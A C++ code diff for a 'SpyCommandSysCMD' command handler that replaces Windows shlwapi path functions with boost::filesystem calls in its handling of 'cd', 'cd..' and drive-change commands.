@@ -1,7 +1,7 @@
 #include "stdafx.h"
 #include "SpyCommandSysCMD.h"
 #include "SpyCommandManager.h"
-#include <shlwapi.h>
+#include <boost/filesystem.hpp>
 
 CSpyCommandSysCMD::CSpyCommandSysCMD()
 : super(eSCT_SystemCmd)
@@ -126,20 +126,16 @@ bool CSpyCommandSysCMD::HandleSpecificCommand(const char* pCommand, std::string&
     {
         char szCurDirectory[MAX_PATH];
         GetCurrentDirectoryA(MAX_PATH, szCurDirectory);
-        PathStripToRootA(szCurDirectory);
-        SetCurrentDirectoryA(szCurDirectory);
+        boost::filesystem::path rootPath(szCurDirectory);
+        SetCurrentDirectoryA(rootPath.root_directory().string().c_str());
         strFeedback.clear();
     }
     else if (_stricmp(pCommand, "cd..") == 0)
     {
         char szCurDirectory[MAX_PATH];
         GetCurrentDirectoryA(MAX_PATH, szCurDirectory);
-        char* pszFilePath = PathFindFileNameA(szCurDirectory);
-        if (pszFilePath != szCurDirectory)
-        {
-            pszFilePath[0] = 0;
-            SetCurrentDirectoryA(szCurDirectory);
-        }
+        boost::filesystem::path curDirectory(szCurDirectory);
+        SetCurrentDirectoryA(curDirectory.parent_path().string().c_str());
         strFeedback.clear();
     }
     else if (_strnicmp(pCommand, "cd ", strlen("cd ")) == 0)
@@ -148,7 +144,8 @@ bool CSpyCommandSysCMD::HandleSpecificCommand(const char* pCommand, std::string&
         GetCurrentDirectoryA(MAX_PATH, szCurDirectory);
         strcat_s(szCurDirectory, "\\");
         strcat_s(szCurDirectory, pCommand + strlen("cd "));
-        if (PathIsDirectoryA(szCurDirectory) != FALSE)
+        boost::filesystem::path curDirectory(szCurDirectory);
+        if (boost::filesystem::is_directory(curDirectory))
         {
             SetCurrentDirectoryA(szCurDirectory);
             strFeedback.clear();
@@ -169,7 +166,7 @@ bool CSpyCommandSysCMD::HandleSpecificCommand(const char* pCommand, std::string&
     }
     else if (pCommand[1] == ':')
     {
-        if (PathIsDirectoryA(pCommand) != FALSE)
+        if (boost::filesystem::is_directory(pCommand))
         {
             SetCurrentDirectoryA(pCommand);
             strFeedback.clear();
